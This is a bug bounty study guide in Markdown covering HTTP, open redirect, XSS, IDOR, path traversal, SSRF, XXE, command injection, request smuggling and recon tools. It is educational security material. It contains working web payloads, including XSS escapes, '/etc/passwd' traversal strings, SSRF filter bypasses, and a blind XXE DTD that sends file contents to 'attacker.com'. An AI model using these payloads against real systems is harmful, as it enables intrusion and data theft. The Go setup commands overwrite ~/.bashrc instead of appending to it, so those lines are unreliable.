# Bug Bounty 

> Arav Budhiraja | 22nd September 2021

# Index 

- [Resources](#resources)
- [HTTP](#http)
- [Open Redirect](#open+redirect)
- [Cross Site Scripting(XSS)](#cross-site-scriptingxss)
- [Insecure Direct Object Reference(IDOR)](#insecure-direct-object-referenceidor)
- [Local File Disclosure(LFD)](#local-file-disclosure-lfd)
- [Server Side Request(SSRF)](#server-side-request-forgeryssrf)
- [XML External Entity(XXE)](#xml-external-entityxxe)
- [Remote Command Execution(RCE)](#remote-command-executionrce)
- [Reconnaissance](#reconnaissance)
	- [Google Dorking](#google-dorking)
	- [Certificate transparency](#certificate-transparency)
	- [Shodan](#shodan)
- [Tools](#tools)
	- [Go](#go)
	- [Subfinder](#subfinder)
	- [WayBackURLs](#waybackurls)
	- [Aquatone](#aquatone)
	- [Gobuster](#gobuster)
	- [Amass](#amass)
	- [Linkfinder](#linkfinder)

# Resources

* <a href="https://www.udemy.com/course/intro-to-bug-bounty-by-nahamsec/">Nahamsec's course</a> - Course
* <a href="https://www.youtube.com/channel/UCQaXCW5fFBaCrXKgaOPxUTw">Spin The Hack</a> - In-depth tutorials
* <a href="https://portswigger.net/web-security">Web Security Academy</a> - Practice
* <a href="https://github.com/swisskyrepo/PayloadsAllTheThings">PayloadAllTheThings</a> - Cheatsheets 


# HTTP

Hyper Text Transfer Protocol

Layer 7 client-server protocol that is used to fetch data from a server as well as submit data to the server. The data can be text/images/videos. Uses TCP as its transport layer protocol and the server listens on port 80. 

The client sends a request to the server and the server sends a response. When making a request, the client must specify a method to perform a task such as reading a resource, creating a resource, updating a resource or deleting a resource on a server.

The response contains a status code that lets the client know whether the request was successful or an error occurred. Additional information can be specified by the client/server via headers in the request/response. The data being transferred is contained in the body of the request/response

It is a stateless protocol i.e. the server does not remember the identity of a client and each client is treated as a new one. Made stateful by the help of cookies which are used small values to let a server remember who a user is and their preferences. The server sets the details to the cookie and sends it to the client's browser via the `Set-Cookie` header which stores it in its database and then the cookie is sent when the following requests are made via the `Cookie` header. Provides an authentication feature too.

HTTP 1.0 required a separate connection to fetch each resource and HTTP 1.1 makes it possible for 1 connection to be established to fetch unlimited resources. All traffic sent using HTTP is unencrypted however it can be made encrypted by SSL or TLS

When a client connects to a web server, his/her computer sends an HTTP request to the server which sends back an HTTP response 

Basic structure of a request/response

```http
Headers\r\n
\r\n
Message Body\r\n
```

## Request 

```http
GET / HTTP/1.1 
Host: google.com 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) 
Date: Mon 20 May,2021
Authorization: admin 
Referrer: bing.com
Content-Length: 5
Content-Type: text/plain

Hello
```

Line 1 -> HTTP Method, Resource to communicate with, Protocol version(Request line)

Line 2 -> Domain/IP address of the server to communicate with (Request header)

Line 3 -> Browser and OS Information 

Line 4 -> Current date (General header)

Line 5 -> Authorization header which is used for authentication i.e. to prove that the client is who they say they are to the server

Line 6 -> Website which sent you to the new website/host. We clicked a link on `bing.com` which brought us to `google.com`

Line 7 -> Length of the data in the request body(Entity header)

Line 8 -> Type of data in the request body(Entity header)

Line 9 -> Space between headers and body

Line 10 -> Content of the request body

At the end of each line, there is a '\r\n' which is used to denote where the line stops (\r) and move to a new line (\n. This is known as CLRF. When the request line is sent, then the server checks it and when it sees a CLRF, it knows that it has reached the end of that line and moves to the next line.

## Methods

* GET - Fetch a resource
* HEAD - Shows only the response headers
* POST - To submit data. Create a new resource or change an existing one. Typically made when we enter data into a form
* PUT - To create a new resource or completely replace an existing one
* DELETE - Delete a resource
* OPTIONS - Shows the allowed methods
* TRACE - The entire request is sent back in the response body
* PATCH - To update certain parts of a resource

### PUT vs PATCH 

If we want to change a certain part of an existing resource and we use the PATCH method, then we would only add the values to be changed in the body

To do the same thing with PUT, we would have to add the values to be changed and all the other values in the current resource in the body

PUT would replace the entire resource and so if we would add only the values to be changed in the body, the resource would only contain the changed values

### PUT vs POST

PUT is idempotent i.e. if the same PUT request is sent multiple times to create/replace a resource, the result would always be the same since PUT would replace the resource and add the same values to the resource

POST is not idempotent i.e. if a POST request is sent multiple times to create/replace a resource, it will result in other effects and the result is not the same

When making a PUT request, we make it to a particular resource such as `/users/1` and when using POST, we make the request to a resource collection such as `/users` which would create a resource under it such as `/users/2`

## Status codes

Server responds with a status code which lets the browser know what data to expect

* 200 range - Successful response
* 300 range - Redirect
* 400 range - Client error
* 500 - Internal server error

All codes: https://developer.mozilla.org/en-US/docs/Web/HTTP/Status

Burp Suite is a great tool to inspect HTTP data such as requests, responses, headers, status codes, etc

# Open Redirect 

A bug which allows an attacker to redirect a victim from a trusted website to a malicious website via by specifying the URL in an unvalidated input whose value is used by the website to perform a redirect

Impact is low unless it is chained with another vulnerability 

```txt
Before https://example.com/red.php?next=google.com
After https://example.com/red.php?next=hacker.com
```

Some web apps have security measures where the developers define the list of trusted and untrusted websites which the web app can redirect to. In some cases, we can bypass this

## Common parameters 

```txt
dest, redirect, uri, path, continue, url, window, to, out, view, dir, show, navigation, Open, url, file, val, validate, domain, callback, return, page, feed, host, port, next, data, reference, site, html
```

## Bypassing examples:

```txt
https://example.com/red.php?next=google.com (allowed)
https://example.com/red.php?next=hacker.com (not allowed)
https://example.com/red.php?next=hacker.com?google.com (allowed)
```

## Open redirect to XSS

```txt
https://example.com/red.php?next=javascript:alert(document.domain)
```

# Cross Site Scripting(XSS)

A vulnerability which allows attackers to inject malicious client side code (Javascript) in a trusted website which would be executed by the victim's browser to perform malicious actions

In this attack, a hacker inserts a Javascript payload into a trusted website. Once the victim visits the website, code is executed and the victims's browser can be controlled by the hacker. The hacker can read/modify/delete content of websites on the client side, steal cookies and phish 

Most common payload is 

```html
<script>alert("hello")</script>
```

## Types

* Reflected - Payload is injected from a request and is added to the code of the website leading to Javascript execution. 
* Stored - Payload is stored in the server's database and is triggered once the victim visits the vulnerable web page
* DOM (Document Object model) - Occurs when a website is using an inbuilt vulnerable function and Javascript code can run because of it

### Reflected 

Data we send to a web app is reflected in its content 

It is client side i.e. only present for the victim being affected and not the same for all since the payload is not stored in the server

Best place to look for XSS is to check for places where we can insert HTML

We should always check the source code of the page to see where our input is being reflected 

### Stored

Also known as persistent XSS

Stored in the server's database and is reflected to a user when he/she visits the vulnerable web page 

Best place to look for stored XSS is a text input where the data we enter is stored somewhere. Example: Comments 

## DOM

When an input value is being in a vulnerable inbuilt function of Javascript

The input value can be a payload which would be executed because of the function

## Bypassing filters 

### Case 1 - Escaping quotes

Lets say that there is a website with an input field

```html
<input  value="">
```

If we type an XSS payload, it will not work since HTML will treat it like a string as it is in double quotes 

```html
<input  value="<script>alert("hello")</script>">
```

However, we can bypass this using test ">. It will treat 'test' as a string, close the input tag and trigger our payload. The payload would be `test"><script>alert("hello")</script>`

```html
<input  value="test"><script>alert("hello")</script>">
```

### Case 2 - Escaping a tag

Lets say that there is a website with an input field which reflects our input to the title of the page

So if we type 'test' in the field, then the title will look like this

```html
<title>test</title>
```

To escape this, we can simply close the title tag and then inject our payload 

```html
<title>test </title> <script>alert(1)</script>
```

### Case 3 - Escaping a variable

Lets say that there is a website with an input field which reflects our input to a javascript variable

```js
var a = 'test';
```

To get XSS here, we can first close the single quote, inject our payload and then comment out the rest of the code. The payload would be `' + alert(1); //`

```js
var a = 'test ' + alert(1); //';
```

# Insecure Direct Object Reference(IDOR)

An access control vulnerability which allows to read another user's data/perform actions as an other user without being the user and not having that user's permissions 

This happens via a user input

Authentication -> Process of verifying the identity of a user to a server i.e. verifying who the user claims to be

Authorization -> Process of verifying whether a user can access a specific resource or perform a specific action

Access Control -> Process of enforcing denial/access to a user when accessing a resource. Depends on authentication and authorization

Lets a hacker read/write/delete data of another user 

For example, lets say we have a social media website with a bunch of users

```json

https://social.com/user/4722

Response:

{
id:4722,
username:'test',
pass:'123456'
}
```

However, we can change the id from '4722' to something such as 1,2 or 3

```json

https://social.com/user/1

Response:

{
id:1,
username:'admin',
pass:'mypassword123'
}
```

If the user id is not being passed via a GET request, we can change the id in the POST request

```json

https://social.com/users/info

Body: id=1

Response:

{
id:1,
username:'admin',
pass:'mypassword123'
}
```

Best way to test is to create 2 users and use their IDs to check for IDOR

Look for IDs in requests 

Sometimes the web app may use some encryption/encoding such as JWT or base64

If the user's ID is long and random, we can check for places where the user ID is leaked. Such as the location of the user's profile picture

Leave Burp Suite running in the background so that we can find any user IDs

# Local File Disclosure (LFD)

If a web app is fetching a file from the server by referencing the file name in a parameter, an attacker might be able to change the file name to another file on the server and thus read other files on the server 

```txt
https://example.com/view.php?file=test.jpg (normal)
https://example.com/view.php?file=../../../../etc/passwd (malicious)
```

If we are not sure about the location of our current working directory, we can keep on adding '../' as in Linux, extra parent directories will not make a difference

In some cases, we may not have to use '../'

```txt
https://example.com/view.php?file=/etc/passwd
```

If the web app is not allowing us to append '../', we can try URL encoding the path

```txt
https://example.com/view.php?file=%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd
```

Or try replacing '../' with '.../.' or '....//'

```txt
https://example.com/view.php?file=....//....//....//....//etc/passwd
```

If the web app is appending a file extension to the end of the file, we can try appending a question and null byte

```txt
https://example.com/view.php?file=../../../../etc/passwd?%00
```

# Server Side Request Forgery(SSRF)

A vulnerability which allows an attacker to force a web app to make requests to servers connected to the internet or in an internal LAN in such a way that the requests originate from the server

The resource can refer to another website or a server in the internal network (The server has 2 interfaces, a public one connected to the internet and one to an internal LAN)

Hacker can abuse a functionality of a server to read/modify internal resources

Allows the hacker to make requests originating from that server 

Lets say that we have a web app which lets us grab images from any website

```txt
https://example.com/grab.php?url=https://image.com/img1.png (normal)
https://example.com/grab.php?url=http://127.0.0.1 (malicious)
https://example.com/grab.php?url=file://etc/passwd (malicious)
https://example.com/grab.php?url=http://hacker-server.com (malicious)
```

SSRF can also be used to perform a host/port scan using Burp's intruder 

Internal SSRF is when we can make requests to internal servers 

External SSRF is when we can only make requests to other servers connected to the internet

## Checking for SSRF

To check for SSRF, we can try loading a file on the target system, load the website from localhost or load our own server

```txt
https://example.com/grab.php?url=http://127.0.0.1 
https://example.com/grab.php?url=file://etc/passwd 
https://example.com/grab.php?url=http://hacker-server.com 
```

When checking for an SSRF using our own server, we should check if the source IP is our's or the server's. If it is our's, then it is our browser who is making the request

If we do not wish to spin up our own server, we can use Burp Collaborator 

If the server is being hosted on a cloud provider, we should check 'http://169.254.169.254' as it holds metadata about the target 

## Blind SSRF

Type of SSRF in which we do not get any output from the requests made

Using this, we can perform a port/host scan. If a response takes long, the port is closed and if the response comes back quickly, the port is closed. To automate this we can use Burp Intruder. 

|   URL         | Response Time | Exists|
| ------------- |:-------------:| -----:|
| https://example.com/grab.php?url=http://127.0.0.1:81 | 80ms | yes |
| https://example.com/grab.php?url=http://127.0.0.1:3821 | 4823ms | no|
| https://example.com/grab.php?url=http://127.0.0.1:8080  | 75ms | yes |

If the request fails, the port is closed and if we get an invalid/successful response, the port is open

```txt
http://localhost:80 -> Successful =  Open
http://localhost:22 -> Invalid HTTP response = Open
http://localhost:20 -> Failed to connect = Closed
```

## Limited SSRF

SSRF in which we do get results from the requests made but the results do not contain much information

For example, we are able to see an HTTP response but not the content

|   URL         | Response | Exists|
| ------------- |:-------------:| -----:|
| https://example.com/grab.php?url=http://127.0.0.1:81 | HTTP/1.1 200 OK | yes |
| https://example.com/grab.php?url=http://127.0.0.1:3821 | HTTP/1.1 404 Not Found | no|
| https://example.com/grab.php?url=http://127.0.0.1:8080 | HTTP/1.1 200 OK | yes |

## Blockers 

* Whitelisting - A set of domains/IPs are allowed to be used in the request 
* Blacklisting - A set of domains/IPs are not allowed to be used in the request  

## Bypassing a blacklist 

Scenario: Requests made to addresses localhost and 127.0.0.1 are blocked 

To bypass this, we will use it's alternate names

* http://127.1
* http://2130706433
* http://017700000001

We should also check by appending a port number to our URL 

```txt
http://localhost:80
https://127.0.0.1:80
```

## Bypassing a whitelist 

Scenario: Requests to only google.com are allowed 

To bypass this we will first type the URL for the internal resource, followed by a # and @ and then google.com 

```txt
https://example.com/grab.php?url=http://127.0.0.1:8080#@google.com
```

If this does not work, try URL encoding the characters 

# XML External Entity(XXE)

A vulnerability in which we can read data from a file stored on the server or a remote resource (on the internet or internal network) by injecting malicious XML code into existing XML code in a request which would be interpreted by the server's XML parser

We inject XML code into existing XML code which is in a request

Occurs when an XML input which is referring to an external entity is weakly configured

Lets us read local files and perform an SSRF 

## Basics of XML

XML -> Extensible Markup Language

Used transferring/reading of data

Used in APIs, configuration files, style sheets, etc. 

Saves data in plaintext 

An XML document is a piece of information containing XML code such as the root element, DTD and tags

```xml
<?xml version="1.0"?> - Metadata such as version, encoding 
Root element (There can be only 1 per document)
<userinfo> 
	<uid>0</uid> - Nested tags
	<uname>root</uname>
	<pass>password123</pass>
</userinfo>
```

XML can also be used to send data from a request to a response 

```txt
Request:

<?xml version="1.0" encoding="UTF-8"?>
<name>test</name>

Response:

HTTP/1.1 200 OK
test
```

XML Parser -> Program which will interpret and run XML code

### DTD and variables

Entities -> Variables in XML

DTD -> Document Type Definition. Portion of the document where entities are defined

```xml
<!DOCTYPE test [ CODE FOR ENTITIES HERE ]>
```

DOCTYPE is a keyword that is used to create a DTD

We can create entities as follows

```xml
<!DOCTYPE test [
	<!ENTITY var "hello world"> 
]>
```

And now we can refer to the entity using '&var;'

```xml
<!DOCTYPE test [ 
	<!ENTITY var "hello world">
	<!ENTITY var2 "hello hello &var;">
]>
<vars>
	<var2>&var2;</var2>
</var>
```

This will print 'hello hello hello world'. This is because first it prints the contents of var2 and then we have referred to var from var2 by using '&var;'

#### Types

- General -> As seen above, these entities are created in the DTD and are then being referred to in another part of the document

```xml
<!DOCTYPE test [ 
	<!ENTITY var "hello world">
]>
<vars>
	<var2>&var;</var2>
</var>
```

- Parameter -> Entities are created in the DTD and can only be referred to in that DTD itself

```xml
<!DOCTYPE test [ 
	<!ENTITY % param "hello world">
	%param
]>
```

They can be referenced in the DTD using the % symbol. However, they cannot be referenced in any entities created in the DTD

- Predefined -> Entities which contain the hex of special characters such as quotes, and symbols, etc. which are created by developers of XML. These are used to store characters which would not be allowed in XML

```xml
<hello>H<llo></hello> - Error because of the < symbol
<hello>H&#x3C;ello</hello> - No error
```

- External -> Entities whose values are not in the current DTD but are fetched from a remote resource (such as a web server/ftp server) or a file on the server. These can be defined via the `SYSTEM` keyword

```xml
<!DOCTYPE test [ 
	<!ENTITY google SYSTEM "https://google.com"> 
]>
<websites>
	<google>&google;</google>
</websites>
```

```xml
<!DOCTYPE test [ 
	<!ENTITY google SYSTEM "file://etc/hostname"> 
]>
<files>
	<file>&file;</file>
</files>
```

The above pieces of code will fetch the content of `google.com` and `/etc/hostname` respectively and it is not the value stored by the them

- Internal DTD -> The DTD is defined in the document

```xml
<!DOCTYPE test [ 
	<!ENTITY var "hello world">
]>
```

- External DTD -> The DTD is located on a remote server and we have to specify the URL of this DTD

```xml
<!DOCTYPE test [ 
	<!ENTITY % grab SYSTEM "http://example.com/external.dtd"> 
]>
<main>
	<user>&user;</user> (If external.dtd has an entity named user defined)
</main>
```

## Exploiting XXE

When exploiting an XXE, we have to add our external entity to a DTD and then refer to that entity in a tag whose value is getting displayed 

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ 
	<!ENTITY file SYSTEM "file://etc/passwd"> 
]>
<location>&file;</location>
```

Note: 'location' is a tag which is already in the request, it will be different for different scenarios

Most websites provide an XML document in the request and we can add our variable to an element in the template

### Reading local files

* Capture the request containing XML code with Burp
* Send it to the repeater 
* Now below `<?xml version="1.0" encoding="UTF-8"?>`, paste the following code

```xml
<!DOCTYPE test [ <!ENTITY file SYSTEM "file://etc/passwd"> ]>
```

This would create an external entity named file to store the content of `/etc/passwd`

* Change the value of a tag whose data is being displayed to '&file;'
* This will display the file

### XXE to SSRF 

* Capture the request containing XML code with Burp
* Send it to the repeater 
* Now below `<?xml version="1.0" encoding="UTF-8"?>`, paste the following code

```xml
<!DOCTYPE test [ <!ENTITY file SYSTEM "http://127.0.0.1/"> ]>
```

This would create an external entity named file to store the content of `http://127.0.0.1`

* Change the value of a tag whose data is being displayed to '&file;'
* This will display the contents of the website running on localhost

### XXE via parameter entities 

We add the code to an XXE external entity as the value of a parameter entity and refer to the parameter variable from the DTD

```xml
<!DOCTYPE abcd [ 
	<!ENTITY % test "<!ENTITY passwd SYSTEM '/etc/passwd'"
	%test
]>

<contact>
	<name>&passwd;</name>
</contact>
```

In this case, a parameter variable is being created in the DTD. This variable stores a piece of XML code which would store the contents of `/etc/passwd`

After doing so, we refer to it in the DTD itself. This means that the line in which it is getting referred to would be replaced with the contents of the entity

Thus, the parser would treat this as valid XML and create a general variable to store the contents of `/etc/passwd`

### XXE via image upload 

* Open notepad and paste the following code. This code will read the content of '/etc/passwd'. You may change it to a different file/a server on the internal network

```xml
<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe
SYSTEM "file:///etc/passwd" > ]><svg width="400px" height="400px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="20" x="0" y="16">&xxe;</text></svg>
```

* Save this file with the extension of '.svg' so that the website thinks we are uploading a legit image 
* Upload this image to the website
* To view the output of the file, open the location of the SVG image which will display it

### Blind XXE

Since we will not get the contents of the file/remote resource, we will request for the contents of the file/resource and send it as an HTTP request to our server  

First we will create a file named 'payload.dtd' on our remote server

In an internal DTD, we cannot add a parameter variable in another variable's content. However if we use an external DTD, this is possible

payload.dtd
```xml
<!DOCTYPE test [ 
	<!ENTITY % file SYSTEM "file:///etc/passwd">  
	<!ENTITY % param "<!ENTITY send SYSTEM 'http://attacker.com:8888/?x=%file;'>">
	%param
]>
```

In the above code, we are first storing the contents of `/etc/passwd` in the file external entity

Following that we create a parameter entity which stores XML code and we refer to the file parameter variable in it

In the last line, we refer to the parameter entity named `param`. The line in which it is getting referred to would be replaced with the contents of the entity

The value is XML code which would create a general entity named `send` to fetch data from the attacker's server

In reality, this will send the contents of the file entity i.e. `/etc/passwd` to the attacker's server via the GET parameter

Here, `attacker.com` is the domain of the hacker's server and `8888` is the port on which the web server is listening. 

Now we can refer to the external DTD from the the website's DTD

```xml
<!DOCTYPE test [ 
	<!ENTITY % grab SYSTEM "http://attacker.com:8888/payload.dtd"> 
]>
<hello>
	<<name>&send;</name>
</hello>
```

After that, we refer to the entity being created by referring the parameter entity. This would cause `<!ENTITY send SYSTEM 'http://attacker.com:8888/?x=%file;'>` to be executed, which would make a GET request to retrieve data from the attacker's server

In reality it would be sending data to the attacker's server

Note: The template maybe different for a different scenario. Make sure to include line 2 below `<?xml version="1.0" encoding="UTF-8"?>` and call the grab variable from an element 

Now we can start listening on 8888

```bash
python3 -m http.server 8888
```

## Remote Code Execution(RCE)

RCE is a vulnerability in which an attacker can remotely run code on the server hosting the web app

With regards to web apps, this is done by uploading containing malicious code and running the code or injecting malicious code into input fields whose value is being used in the web app's backend code (Python, PHP, etc. )

Allows a hacker to execute commands remotely on a system

Can be done by injecting a command or code

Lets say that we have a website which accepts an id number and runs a script to check if its an even number 

```txt
https://example.com/even.php?num=2
```

This will return a script and using that number as an argument 

```txt
$ ./checkEven 2
```

There are many ways to check for an RCE in this scenario


```md
|   URL         | Command | 
| ------------- |:-------------:|
| https://example.com/even.php?num=2;ls | ./checkEven 2; ls | 
| https://example.com/even.php?num=2&&%20ls | ./checkEven 2 && ls|
| https://example.com/even.php?num=2%20&%20ls | ./checkEven 2 & ls| 
| https://example.com/even.php?num=2%20$(ls)  | ./checkEven 2 $(ls) |
| https://example.com/even.php?num=2%20|%20ls | ./checkEven 2 | ls | 
```

This will check the number and display even/odd and the output of the ls command

Best and safe commands to run: ls, pwd, uname -a, id and hostname

If we are able to run code, then we can execute an OS command with the program 

We should check for an RCE at places from where data is being sent to the server and data is being sent back to us

## HTTP Request Smuggling 

The current stable version of HTTP is 1.1 and the old one is 1.0

In HTTP 1.0, we would have to establish a new connection to request for a resource of a website

In HTTP 1.1, only 1 persistent connection is established between the website and our computer and the resources are requested at once. If the 'Connection' header in a request is set to 'keep-alive', then there is a persistent connection for requesting resources. This comes in HTTP 1.1 by default. If we set the value as 'close' then a new connection is established for each request 

### HTTP Pipelining 

In a persistent connection, lets say that we send 3 requests to the web server for 3 resources. First request is sent, then second and then third

Now for the response, the response for the first request is sent first, followed by the second and then the third. Principle: First in, first out. It is sequential 

This is not used by our browser

### Frontend server and Backend server

HTTP Request from a user --> Frontend server --> Single TCP Connection --> Backend server

Frontend server - Load manager/balancer. It is also the caching server and reverse proxy. Example: ngrok 

The frontend server receives requests from many users which are establishing many TCP connections with it to send their requests. The frontend server opens a single TCP connection with the backend server which receives the requests sequentially and sends responses sequentially. The single TCP connection stays alive for a long time and may close at the end of the day. The frontend server then forwards the response to the correct user. This is where HTTP pipelining is used. 

### Transfer Encoding 

This is similar to Content-Type

Lets data be divided into different chunks 

```http
GET / HTTP/1.1 
Host: google.com
Content-Type: text/plain
Transfer-Encoding: chunked 

5
Hello
6 
 World
0
```

In transfer encoding, when the server sees the value of 'Transfer-Encoding' as chunked, it goes to the request body to check the content length

It first sees '5' and then the line ends. It gets to know that the line after that will have data whose length is 5. It then moves to the line after that where it sees '6' and gets to know that the line after that will have data whose length is 6. It then moves to the line after that where it sees length is 0 and knows that it has reached the end of the request body

In a request, if both the 'Content-Length' header and 'Transfer-Encoding' header are provided, then the 'Content-Length' header is ignored. This is a universal truth

When transfer encoding is being used and when the server sees a length as 0, it will ignore everything after it

### Smuggling an HTTP request 

```http
GET / HTTP/1.1 
Host: google.com
Content-Type: text/plain
Transfer-Encoding: chunked 

5
Hello
6 
 World
0

G
```

In this case, the server will ignore everything after '0' and the request will not include the bottom 'G'

```http
GET / HTTP/1.1 
Host: google.com
Content-Type: text/plain
Transfer-Encoding: chunked 

5
Hello
6 
 World
0
```

However, when someone makes a request to the server, this 'G' is added to their request

```http
GGET / HTTP/1.1 
Host: google.com
Content-Type: text/plain
Content-Length: 5

Hello
```

### Types

* CL.TE 
* TE.CL 
* TE.TE 

CL - Content Length 
TE - Transfer Encoding 

### CL.TE

In this case, the frontend server supports content length and the backend server supports transfer encoding

If we want to smuggle a request to the backend server, such that the next request will use a method named `GPOST`, we can send this request 

```http
POST / HTTP/1.1
Host: example.com
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked \r\n
\r\n
0 \r\n
\r\n
G
```

Each of the CLRFs are counted as a character and so the length is 4 and there are 'G' and '0' which make the total content length 6

Note: The CLRFS should be removed

In this case, the request is first sent to the frontend server which will process the content length as 6 bytes and will send the request to the backend server

The backend server will ignore the content length and check the transfer encoding. It checks the request body where it sees the length of the first piece of data is 0 and understands that the request has ended and terminates it

However, at the bottom the backend server has still not processed 'G' and treats it as being the start of the next request

So now if someone sends a post request 

```http
POST / HTTP/1.1
Host: example.com
Content-Length: 5

Hello
```

The backend server will treat the request method as 'GPOST' as it appends G to the start of the request and will return a response saying that GPOST is an unrecognized method

Note: 'G' can be replaced with anything you wish to add to the next request 

### TE.CL

In this case, the frontend server supports transfer encoding and the backend server supports content length

If we want to smuggle a request to the backend server, such that the next request will use a method named GPOST, we can send this request 

```http
POST / HTTP/1.1
Host: example.com
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked \r\n
\r\n
5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 5 \r\n
\r\n
a=1 \r\n
0
```

In this case, the request is first sent to the frontend server which supports transfer encoding and so it checks the request body. Here it first sees 5c. 5c is the hexadecimal form of 92 bytes which is the length of the request which we will smuggle. 92 bytes refers to the 3 lines of our request, the space after the content length header, the new line, the post parameter and its value, the space after that and then '0'

Note: The CLRFS should be removed

Click <a href="https://web.cecs.pdx.edu/~harry/compilers/ASCIIChart.pdf">here</a> to check the hexadecimal equivalent for a byte and click <a href="https://lingojam.com/ByteCounter">here</a> for a bytes calculator

After that the frontend server sees 0 which terminates the request. This request is now sent to the backend server. 

It will take 2 spaces i.e. after the content length header and the new line and a '5' and 'c' as the content and then terminate the request. However, our smuggled request has not been processed and so the backend server will add this to the start of the next request 

So now, when someone sends a request

```http
POST / HTTP/1.1
Host: example.com
Content-Length: 5

Hello
```

The server responds by saying that GPOST is an unrecognized method as it has appended the remaining part of our request to this one

Note: When doing this, make sure to turn off "Update Content-Length". This can be found in the repeater's menue sure to turn off "Update Content-Length". This can be found in the repeater's menu

## Reconnaissance 

Idea- To find as many assets and more content

Helps us extend our attack surface 

Asset Discovery - Map out a company's entire infrastructure 

Content Discovery - Find additional information such as folders, file, ports, logs, etc

For example: If we have a directory which we are forbidden from accessing, we should try bruteforcing it to find subdirectories and files

### Google Dorking

Finding hidden and juicy information by using google's search engine

This is done by using specific search terms

* site -> Finds URLs which have that domain 
* inurl -> Search for a keyword in the URLs
* intitle -> Search for a keyword in the title
* ext -> Specify a file extension
* "-" -> Exclude something

```txt
site:example.com ext:php intitle:Admin
site:example.com -www -"hello-world" inurl:login
```

### Certificate transparency 

Process of finding information by using SSL certificates

Best website to do so is https://crt.sh

Simply type in the website and it will show it's subdomains and the information it could extract from the SSL certificates 

We can automate the process of finding subdomains and taking screenshots using crt.sh by adding this code to a bash script named 'subdomains.sh'

```bash
mkdir $1-screenshots
curl -s https://crt.sh/\?q\=%25.$1\&output\=json | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u | httprobe | aquatone
```

And now we can run the script and specify the domain

```bash
chmod +x ./subdomains.sh
./subdomains.sh example.com
```

### Shodan

Helps in finding subdomains and asset discovery

Website is https://shodan.io

To search using a domain name, we will use the 'hostname' term

```txt
hostname=example.com
```

On the right, Shodan displays filters such as server location, the services running, the organization and the the technology being used on the server

Now you can click on a result. It displays the server's country, organization, the ISP, hostname, Last Update and AS number

By default, shodan will also a port scan 

Shodan can also look for SSL certificates by using the 'ssl' term

```txt
ssl:example.com
```

This displays all subdomains of example.com which have an SSL certificate

Another search term is 'port' which can be used to find subdomains which have the specified port open

```txt
hostname:example.com port:8080
```

Now we can click on a result and it will display information about the service running on that port

Shodan has another search term named 'org' which can be used to specify an organization

```txt
org:"Example Motors" port:8080
```

This will display all the domains and subdomains belonging to Example Motors, which have port 8080 open

Shodan can also check if a server is using a particular technology 

```txt
hostname:example.com product:MongoDB
```

## Tools

### Go

Programming language created by google

Faster than other languages 

We need to install it as most of our tools will use it

```bash
sudo apt install -y golang
echo "export GOROOT=/usr/lib/go" > ~/.bashrc 
echo "export GOPATH=$HOME/go" > ~/.bashrc 
echo "export PATH=$GOPATH/bin:$GOROOT/bin:$PATH" > ~/.bashrc 
source ~/.bashrc
go version
```

### Subfinder

Used to find subdomains

Installation 

```bash
sudo apt install subfinder
```

Finding subdomains 

```bash
subfinder -d example.com
```

Saving the discovered subdomains to a file

```bash
subfinder -d example.com -o subdomains.txt
```

Checking if subdomains are alive and if they are using http/https by using httprobe 

```bash
subfinder -d example.com -o subdomains.txt
cat subdomains.txt | httprobe | tee httprobe.txt
```

Taking screenshots of live subdomains by using aquatone 

```bash
subfinder -d example.com -o subdomains.txt
cat subdomains.txt | httprobe | aquatone
```

### WayBackURLs

Used to display URLs from the wayback machine

Installation 

```bash
sudo go get github.com/tomnomnom/waybackurls
```

Finding all URLs for a domain by using the wayback machine

```bash
waybackurls example.com
```

Displaying all URLs, except subdomains

```bash
waybackurls example.com -no-subs
```

Displaying the date of fetch

```bash
waybackurls example.com -dates
```

### Aquatone

Enumeration tool that lets us visualize results

Installation

```bash
sudo apt install chromium-browser
cd ~/opt
wget https://github.com/michenriksen/aquatone/releases/download/v1.7.0/aquatone_linux_amd64_1.7.0.zip
unzip aquatone_linux_amd64_1.7.0.zip
cd aquatone_linux_amd64_1.7.0
sudo mv ./aquatone /usr/bin/aquatone
```

Aquatone also has another set of tools written in ruby 

```bash
sudo gem install aquatone
```

Finding subdomains

```bash
aquatone-discover -d example.com 
```

Finding common open ports on subdomains

```bash
aquatone-scan -d example.com
```

Display HTTP status codes, headers and take screenshots

```bash
aquatone-gather -d example.com
```

Find subdomains which are vulnerable to subdomain takeover 

```bash
aquatone-takeover -d example.com
```

Visualize your enumeration results

```bash
subfinder -d example.com -o subdomains.txt
cat subdomains.txt | aquatone -ports 80,443,8080,8443 -out ./aquatone
```

Now we can open the current directory in chromium and view the 'aquatone_report.html' file

### Gobuster

Used for directory/file bruteforcing

Finding directories

```
gobuster dir -u example.com -w wordlist.txt
```

Hide the gobuster banner

```
gobuster dir -u example.com -w wordlist.txt -q
```

Specify file extensions

```
gobuster dir  -u example.com -w wordlist.txt -x html,txt,php
```

Save the output in a file 

```
gobuster dir  -u example.com -w wordlist.txt -o results.txt
```

### Amass

Used for mapping and asset discovery

Installation

```bash
sudo apt install amass
```

Amass has many subcommands which are appended after 'amass'

* intel - Discover targets(Important)
* enum - Perform enumeration on targets(Important)
* viz - Visualize results
* db - Manipulate the graph DB
* dns - Resolve DNS names

Getting help for a subcommand

```bash
amass intel -h
amass enum -h
```

Getting an ASN number of an organization

```bash
amass intel -org "example"
```

Getting the whois record of an organization

```bash
amass intel -whois example
```

Finding subdomains

```bash
amass enum -d example.com -o subdomains.txt
```

Checking if ports are open

```bash
amass enum -d example.com -p 80,443,8443,8080
```

### LinkFinder

Finds endpoints from JavaScript files

Installation

```bash
cd ~/opt
git clone https://github.com/GerbenJavado/LinkFinder.git
cd LinkFinder
sudo python3 setup.py install
```

Finding URLs and saving it to an HTML file

```bash
python3 linkfinder.py -i example.com -o linkfinder.html
firefox linkfinder.html
```

Finder URLs and viewing them in the terminal

```bash
python3 linkfinder.py -i example.com -o cli
```

****
